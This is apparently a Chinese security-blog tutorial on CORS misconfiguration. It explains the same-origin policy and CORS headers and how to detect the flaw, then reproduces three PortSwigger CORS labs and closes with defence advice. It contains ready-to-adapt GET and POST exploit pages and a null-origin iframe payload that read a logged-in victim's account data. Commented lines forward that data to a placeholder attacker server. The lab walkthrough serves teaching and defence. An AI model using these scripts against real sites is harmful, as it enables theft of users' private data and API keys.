#  CORS 跨域漏洞攻防实战：靶场复现 + POC 编写 + 防御配置  
原创 m3x1
                    m3x1  梦醒安全   2026-03-28 23:57  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Aj9tsa4DmOmra6EI659XoNIvNn9wnMpVqicmqFmpJAwWJA0fw90SqBVOCEicpkLlV63QbNibrCx4BYT4JKia33l1Yg/640?wx_fmt=png&from=appmsg "")  
  
免责声明：本公众号内容仅用于知识分享和学习，由于传播、利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号梦醒安全及作者不为此承担任何责任，一旦造成后果请自行承担！  
  
PART.01  
  
前言  
  
在 Web 渗透测试领域，跨域安全始终是绕不开的核心议题 —— 同源策略（SOP）作为浏览器的基础安全屏障，既守护了不同源之间的资源隔离，也因业务场景的跨域需求催生了跨源资源共享（CORS）机制。然而，CORS 的灵活配置特性，也让 “配置不当” 成为 Web 应用的高频安全漏洞之一。  
  
PART.02  
  
内容  
## 域  
  
在前端中，“域”是由以下三个部分共同组成的：  
  
<table><thead><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: hsl(var(--border));"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">组成部分</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">举例</span></section></td></tr></thead><tbody><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: hsl(var(--border));"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">协议(protocol)</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">http://或https://</span></section></td></tr><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: hsl(var(--border));"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">主机(hostname/域名)</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><span style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: hsl(var(--border));text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;color: rgb(87, 107, 149);"><span leaf="">www.example.com，api.example.com</span></span></td></tr><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: hsl(var(--border));"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">端口(port)</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">80、443、8080等</span></section></td></tr></tbody></table>  
  
**简单来说**  
：Origin(域) = 协议 + 域名 + 端口  
## 同源策略（SOP）  
  
同源策略是浏览器的一种安全机制，它限制一个源的js脚本对另一个源的访问。  
  
浏览器的同源策略规定：不同域的客户端脚本在没有明确授权的情况下，不能读写对方的资源。  
  
同源指三个部分相等，即**协议，域名**  
和**端口**  
，三者有一个不同即视为不同源  
  
**简单来说**  
：在浏览器中，只有当协议、域名、端口相同的情况下，才能读写对方的dom、cookie、session、ajax等操作的权限资源。  
## 跨源资源共享（CORS）  
  
CORS的出现是用来弥补SOP（同源策略）的不足。  
  
在当时SOP有些限制了网页的业务需求，不能够使不同域的网页互相访问，因此提出了CORS：用于绕过SOP（同源策略）来实现跨域资源访问的一种技术。(CORS使用自定义的HTTP头部让浏览器与服务器进行沟通，它允许浏览器向跨域服务器发出XMLHttpRequest请求，从而克服AJAX只能同源使用的限制。)  
  
同源策略用来限制一个网站对不同源网站的访问，但是如果有一个网站要对信任的不同源站点进行访问，同源策略就是造成妨碍。  
  
CORS是放宽同源策略的一套机制，它通过使用一套HTTP请求来实现  
### 常用CORS请求头  
  
● Origin和Access-Control-Allow-Origin：响应的和请求头的Origin必须对得上，才能够访问响应。当Access-Control-Allow-Origin字段值为‘*’时，就代表任意域都可以访问。  
  
● Access-Control-Allow-Credentials：Boolean 如果请求包含如cookie，authorization headers等认证信息时，是否允许读取响应  
  
●Access-Control-Allow-Methods: PUT, POST, OPTIONS 限制请求方法  
  
● Access-Control-Allow-Headers: Special-Request-Header 请求需要包含特点头部  
  
● Access-Control-Max-Age 预检请求的结果可以被缓存多久  
## CORS跨域漏洞  
### 概述  
  
CORS跨域漏洞的本质是服务器配置不当  
  
即Access-Control-Allow-Origin取自请求头Origin字段，Access-Control-Allow-Credentials设置为true。  
  
导致攻击者可以构造恶意的脚本 , 诱导用户点击获取用户敏感数据  
  
CORS请求可分为两类，**简单请求和非简单请求**  
。  
### 漏洞原理  
  
浏览器直接发出CORS请求，接下来浏览器会自动在请求的header中加上Origin字段，告诉服务器这个请求来自哪个源。  
```
Origin:
```  
  
服务器端收到请求后，会对比这个字段，如果这个源在服务器端的许可范围内，服务器的响应头会加上以下字段  
```
Access-Control-Allow-Origin：(这里的值为Origin的值)Access-Control-Allow-Credentials:true
```  
  
![image-20260327233452867](https://mmbiz.qpic.cn/mmbiz_png/f0zVXnDXPGO4B7ZP5kpG7AFCzE2SaxWIHqj8Qicic6F3mWhlyxEgBMuKtpaGnDs6hNbLytODbic1DeBicYeGxI1zYe0kSNxgHyrjJ2T2gbicsiayo/640?wx_fmt=png&from=appmsg "null")  
  
image-20260327233452867  
  
如果说服务端配置了 Access-Control-Allow-Origin 响应头，并且浏览器认可该值，**跨域就被允许了，此时漏洞也产生了**  
### 验证方式  
  
只需要在header中添加以下内容即可验证  
```
Origin: foo.example.org
```  
  
然后返回值携带以下，就能证明存在跨域漏洞。  
```
Access-Control-Allow-Origin: foo.example.orgAccess-Control-Allow-Credentials: true
```  
  
![image-20260327233752056](https://mmbiz.qpic.cn/mmbiz_png/f0zVXnDXPGOtFGDKUC1rGpGYqEADP72kHhsXicfliaycKkmFf3lBZlhvWPcHqwlEYFgw41JpUnJykPl6g2l0JvI2s6P1vaKpqes5cDUDH3jIM/640?wx_fmt=png&from=appmsg "null")  
  
image-20260327233752056  
### 不存在漏洞情况  
  
如果有下面的情况可以说基本不存在CORS，**除非你删除掉参数后依然能够得到响应**  
，那说明上面的参数是一个无效参数也就是一个摆设。  
1. 1. 响应包中的**Access-Control-Allow-Origin值一直为**  
*，不随着请求包中的origin改变。组合如下，因为浏览器会阻止如下的配置：  
  
```
Access-Control-Allow-Origin: *Access-Control-Allow-Credentials: true
```  
  
![image-20260327235155501](https://mmbiz.qpic.cn/mmbiz_png/f0zVXnDXPGNfs3qdqzE3QQxNHAiccmpbrcSHibx1QflPX4T5cLP8Os0SxvDzQCWQWwNC2hzCALwJbpOAL9v5uNibKNibMHMNO2F6jtH7UpsHiaaI/640?wx_fmt=png&from=appmsg "null")  
  
image-20260327235155501  
  
Access-Control-Allow-Origin表示允许跨域访问的host，后端将其设置成了'*'，代表允许所有网站的跨域请求，当这种情况的时候，即便Access-Control-Allow-Credentials为true，那也会被浏览器认定为是不安全的，就不能将cookie发送到服务端。  
1. 2. 数据包中必须**包含个人信息才能响应**  
的，也不存在漏洞，如数据包中必须包含电话号码  
  
![image-20260327235245969](https://mmbiz.qpic.cn/sz_mmbiz_png/f0zVXnDXPGM1ia1PbDhmcbiagRliaBtxyPpLktLdPDy5ria6AUCvwkfkSNoicqSFsW8ohdcLHOr9icaDlF80L8Bklvpbaet4jukZmlGxicY1K8dTSM/640?wx_fmt=png&from=appmsg "null")  
  
image-20260327235245969  
1. 3. 有**token**  
进行验证  
  
![image-20260327235321374](https://mmbiz.qpic.cn/mmbiz_png/f0zVXnDXPGOlQlJJD4NnEMz85QcT7IIyy6tMNVyqYniansP3S1jzIDjWsznMvWucyONRYBCGb5195U7L0KIZZpzGHSibXicDaJiaGiaiatYZhKsF8/640?wx_fmt=png&from=appmsg "null")  
  
image-20260327235321374  
1. 4. 有**签名**  
  
![image-20260327235342923](https://mmbiz.qpic.cn/sz_mmbiz_png/f0zVXnDXPGN2txsxONGV54hLpM5ggVxzUEE1h4DMsYaSXhKxE8CyFicRK78d0mgsYIeVicZz1E0cIojzIdaX72iaSea9oTUVWNwZjE6kdervWE/640?wx_fmt=png&from=appmsg "null")  
  
image-20260327235342923  
1. 5. 传入的参数中必须包含用户的一些用户名之类（这个只能说限制太多，首先你得获取到别人的用户名之类，其次你还要一个搞成一个专属的链接给他人点击，就这两个条件太苛刻，危害不大，但是如果你想交也可以蛮交）  
  
![image-20260327235448431](https://mmbiz.qpic.cn/mmbiz_png/f0zVXnDXPGNwXJk1bLe2Po0PMOxg6SN9ksGK7RjgkUuqCuHeAV2anVAEPQkrTBrlmRTfeyNTTwjHTPRHiapsqlOaDNl22nedWgPNkvgBhNOU/640?wx_fmt=png&from=appmsg "null")  
  
image-20260327235448431  
### 简单请求  
  
1、请求方式为GET，POST，HEAD这三种之一  
  
2、HTTP头不超出以下这几个字段  
```
AcceptAccept-LanguageContent-LanguageLast-Event-IDContent-Type：application/x-www-form-urlencoded、multipart/form-data、text/plain
```  
  
当浏览器发现服务器的请求为简单请求时，会在头信息里加入Origin字段。Origin字段代表此次请求来自哪个域，服务器就可以检验是否来自该域。如果匹配，服务器就会在响应包中增添三个字段：  
```
Access-Control-Allow-OriginAccess-Control-Allow-CredentialsAccess-Control-Expose-Headers
```  
  
其中 Access-Control-Allow-Origin是必须有的，而剩下两个可有可无。  
## GET型CORS  
  
**有Referer先删除Referer**  
，然后发送看是否能够正常请求  
  
这里在请求包中修改Origin字段，发现响应包的Access-Control-Allow-Origin会随之改变，即存在有CORS配置不当漏洞  
  
利用脚本：  
```
<!DOCTYPE html><html><head> <title>cors liyon</title></head><body><script>    var req = new XMLHttpRequest();    req.onload = reqListener;    req.open('get','https://xxx.com/accountDetails',true); // 替换下URL地址为漏洞地址    req.withCredentials = true;    req.send();    function reqListener() {        alert(this.responseText);        // 真实环境利用时，重定向至我们的服务器        // location='https://xxx.com/log?key='+this.responseText;    };</script></body></html>
```  
  
将上面的内容保存为HTML，在登录该账号的浏览器中访问即可  
## POST型CORS  
  
有的时候我们会遇到post请求，post请求就得使用以下脚本。  
```
<!DOCTYPE html><html><head> <title>cors liyon</title></head><body><script type="text/javascript"> var http = new XMLHttpRequest(); var url = 'https://www.xxx.com/api/address'; //就替换下URL地址为漏洞地址即可 var params = 'timeio=true'; //替换post中的参数 http.open('POST', url, true); http.withCredentials = true; http.setRequestHeader("Content-type","application/json;charset=UTF-8"); http.onreadystatechange = function() {  if(http.readyState == 4 && http.status == 200) {   alert(http.responseText);   //真实环境利用时，重定向至我们的服务器   //location='http:xxx.xxx.xxx/log?key='+this.responseText;    } } http.send(params);</script></body></html>
```  
  
PART.03  
  
靶场复现  
  
  
使用 burp 的 CORS 靶场  
### Lab1: CORS vulnerability with basic origin reflection  
> This website has an insecure CORS configuration in that it trusts all origins.  
> To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.  
> You can log in to your own account using the following credentials: wiener:peter  
  
  
使用账户登录后，bp抓包看到有敏感信息  
  
![image-20260328194804870](https://mmbiz.qpic.cn/sz_mmbiz_png/f0zVXnDXPGMHtBzqdoZKsVZuSbZt6Xk4fcOSC2w1jC8falywuABzDOfViaxrcJ7gBR8FdlqQ97zymoKHqWSCfjjUpaffbcBWUJylLibbvCaTs/640?wx_fmt=png&from=appmsg "null")  
  
image-20260328194804870  
  
添加头部：  
```
Origin: foo.test.com
```  
  
![image-20260328194900109](https://mmbiz.qpic.cn/mmbiz_png/f0zVXnDXPGNzhHCjrlPJV2r7p3obhsKIvxiaPCoYTMLDFEZseia8Rgxg66jjXmlEOKjR2JyMwmg2erYTtzErqEJ186DSrJmBxc8icdz9xtOicicE/640?wx_fmt=png&from=appmsg "null")  
  
image-20260328194900109  
  
我们修改请求包中的Origin字段，返回包中Access-Control-Allow-Origin字段也会对应被改变，根据返回包的字段，说明存在CORS漏洞  
  
使用如下poc:  
```
<!DOCTYPE html><html><head> <title>cors liyon</title></head><body><script>    var req = new XMLHttpRequest();    req.onload = reqListener;    req.open('get','https://0a7f000d0451813883a44196002a0039.web-security-academy.net/accountDetails',true);    req.withCredentials = true;    req.send();    function reqListener() {        alert(this.responseText);    };</script></body></html>
```  
  
将poc保存成html文件，然后使用python开启http服务，访问 http://localhost:端口/xxx.html  
  
![image-20260328195212551](https://mmbiz.qpic.cn/sz_mmbiz_png/f0zVXnDXPGNnAIg6VoQsRwhr3SaO6V4RaicjZCqqbtic7KL9yA9MrusTn5EDhuicmwJZKd0DAicuxoRfjXtFBxLwSYfyia76dC3Koz4MiciaDQT4IM/640?wx_fmt=png&from=appmsg "null")  
  
image-20260328195212551  
  
当受害者去访问这个html文件时，即可获得用户的敏感信息  
  
在**真实场景**  
应用中，可以让响应结果重定向至我们的服务器  
  
现在这个靶场就需要重定向到它指定的服务器  
```
<script>    var req = new XMLHttpRequest();    req.onload = reqListener;    req.open('get','https://0a7f000d0451813883a44196002a0039.web-security-academy.net/accountDetails',true);    req.withCredentials = true;    req.send();    function reqListener() {        location='/log?key='+this.responseText;    };</script>
```  
  
拿到 administrator用户的key，提交  
### Lab2、CORS vulnerability with trusted null origin  
  
这关是添加了Origin字段后，返回包中并没有出现Access-Control-Allow-Origin  
  
![image-20260328195409478](https://mmbiz.qpic.cn/mmbiz_png/f0zVXnDXPGPEHF0ic7yapmDWkCccFTRJIWURQlPzdib9pibPd8nDUxsNHY4pRzz89IaHgfFsOEEUxyFmgdFn3UXXTn1eRBw5Q0OSjoYY5lvj5Q/640?wx_fmt=png&from=appmsg "null")  
  
image-20260328195409478  
  
但是当我们添加的Origin字段为null时，返回包中才出现了Access-Control-Allow-Origin字段（后端可能将null加入了白名单）  
  
![image-20260328195438029](https://mmbiz.qpic.cn/mmbiz_png/f0zVXnDXPGOK2YSWujaicicCmzaOd4AticFZahzrS8Mlxg9jXQp9UFXrhgib3LCRZ2PA56ObKKHO7NcVM8ulBVdIrqREjoE04VcRDeqzmS8Vx3E/640?wx_fmt=png&from=appmsg "null")  
  
image-20260328195438029  
  
null在这种情况下，攻击者可以使用各种技巧来生成包含Origin 标头中的值的跨源请求，这样就会满足白名单，导致跨域访问。  
  
比如**利用iframe沙箱属性进行跨域请求**  
，我们可以构造如下POC  
```
//利用iframe沙箱属性进行跨域请求<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>    var req = new XMLHttpRequest();    req.onload = reqListener;    req.open('get','https://0a1f00e90451859e80b921770042004f.web-security-academy.net/accountDetails',true);    req.withCredentials = true;    req.send();    function reqListener() {        location='/log?key='+this.responseText;    };</script>"></iframe>
```  
  
拿到 administrator用户的key，提交  
### Lab3: CORS vulnerability with trusted insecure protocols  
  
通过测试发现只有当Origin字段的值为受信任的源时，返回包中才会出现Access-Control-Allow-Origin字段（后端可能设置了Origin的白名单为该站点的子域或者根域）  
  
![image-20260328203806907](https://mmbiz.qpic.cn/mmbiz_png/f0zVXnDXPGNyf7Bbu6dENZ4HUibl4qIglZkumUficNwAqVqXOvkrOBNuiaX8NicsXKj07ib4cEl6VapptMRbFoiaPXFT8aWNdHEg6Z8ZenugLico0s/640?wx_fmt=png&from=appmsg "null")  
  
image-20260328203806907  
  
但是如果白名单中的站点很容易遭受XSS攻击的话，攻击者可以向其投放恶意脚本然后利用CORS的信任关系执行它  
  
这时我们需要找到一个容易遭受XSS攻击的站点（前提是这个站点必须是受信任的源，即该站点的子域或者根域）  
  
![image-20260328203944336](https://mmbiz.qpic.cn/sz_mmbiz_png/f0zVXnDXPGMCV2gRkibgyx0PmtPokOCDWiceqFWTyrbicLmzHc9AXqeNdyBl9a4KIpyocNHSHB2CCghRsZulAvPticsiaOERsTVoPibxOyabcgYiaI/640?wx_fmt=png&from=appmsg "null")  
  
image-20260328203944336  
  
在其子域上找到一个存在XSS漏洞的站点，至此，可以构造如下POC，利用XSS漏洞去执行POC  
```
<script>    var req=new XMLHttpRequest;    req.onload=reqListener;    req.open('get','https://0a1d00450359fba6c2bcedb600720021.web-security-academy.net/accountDetails',true);    req.withCredentials=true;    req.send();    function reqListener(){        alert(this.responseText);        //location='http:xxx.xxx.xxx/log?key='+this.responseText;      };</script>
```  
  
PART.04  
  
防御措施  
  
  
**1、正确配置跨域请求**  
  
应该在有敏感资源的页面中Access-Control-Allow-Origin头指定正确的可信源，仅允许可信任的站点进行跨域请求。  
  
**2、避免将null设置为白名单**  
  
应该避免设置Access-Control-Allow-Origin: null，因为有些攻击手段可以利用这一点发动CORS攻击，比如iframe沙箱等等。  
  
CORS 跨域漏洞的本质是服务器端的配置疏漏，其防护核心并非依赖复杂的技术手段，而是建立严谨的跨域访问控制逻辑。  
  
PART.05  
  
往期推荐  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/b7iaH1LtiaKWW8vxK39q53Q3oictKW3VAXz4Qht144X0wjJcOMqPwhnh3ptlbTtxDvNMF8NJA6XbDcljZBsibalsVQ/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=49 "")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&wxfrom=5&tp=webp&wx_lazy=1#imgIndex=50 "")  
  
**往期好文**  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&wxfrom=5&tp=webp&wx_lazy=1#imgIndex=53 "")  
  
  
  
[揭秘PDF与JS混编攻击：Polyglot文件的构造与防御](https://mp.weixin.qq.com/s?__biz=MzYzNjAwMjQ3OQ==&mid=2247485028&idx=1&sn=dcbdd3cd69fe767cd6cdbc24600e0556&scene=21#wechat_redirect)  
  
  
[深入理解OAuth 2.0：原理、流程与安全风险](https://mp.weixin.qq.com/s?__biz=MzYzNjAwMjQ3OQ==&mid=2247485029&idx=1&sn=560293b3792153ce6dd3de65975c0f0e&scene=21#wechat_redirect)  
  
  
[GNU Inetutils Telnetd 远程认证绕过漏洞（CVE-2026-24061）深度剖析与防护指南](https://mp.weixin.qq.com/s?__biz=MzYzNjAwMjQ3OQ==&mid=2247485064&idx=1&sn=322b4b95414b428d59ebf795466e5dbb&scene=21#wechat_redirect)  
  
  
[CVE-2026-24061漏洞快速检测工具](https://mp.weixin.qq.com/s?__biz=MzYzNjAwMjQ3OQ==&mid=2247485070&idx=1&sn=7513ea32faa0fa4ef543b4481e37ab99&scene=21#wechat_redirect)  
  
  
[YoScan：一站式资产收集神器深度解析](https://mp.weixin.qq.com/s?__biz=MzYzNjAwMjQ3OQ==&mid=2247485072&idx=1&sn=4fde1a17a98f82dfaab54ab15d7ed636&scene=21#wechat_redirect)  
  
  
[LoveJS插件——Web漏洞挖掘的高效信息搜集利器](https://mp.weixin.qq.com/s?__biz=MzYzNjAwMjQ3OQ==&mid=2247485079&idx=1&sn=bced0fba3490ff0905f6ef845ee553e4&scene=21#wechat_redirect)  
  
  
[记一次某实训系统Web安全综合实战靶场思路](https://mp.weixin.qq.com/s?__biz=MzYzNjAwMjQ3OQ==&mid=2247485144&idx=1&sn=bc3ed6d4f4398b288ae81c2bd875371d&scene=21#wechat_redirect)  
  
  
